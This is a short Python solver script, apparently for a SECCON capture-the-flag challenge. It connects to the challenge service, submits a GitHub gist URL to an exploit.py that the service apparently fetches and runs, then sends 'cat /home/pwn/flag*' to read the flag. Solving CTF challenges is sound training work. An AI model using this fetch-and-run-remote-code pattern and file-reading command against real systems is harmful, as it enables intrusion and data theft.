from ptrlib import *
import os
import time

HOST = os.getenv('SECCON_HOST', 'localhost')
PORT = os.getenv('SECCON_PORT', '9064')

url = "https://gist.githubusercontent.com/ptr-yudai/609a84a7c44eb468cdf49a426bb723f2/raw/7866c5392a023e4f7ff872d878f21574a984049c/exploit.py"

sock = Socket(HOST, int(PORT))

sock.sendlineafter(": ", url)
time.sleep(1)
sock.sendline("cat /home/pwn/flag*")
print(sock.recvline())

sock.close()
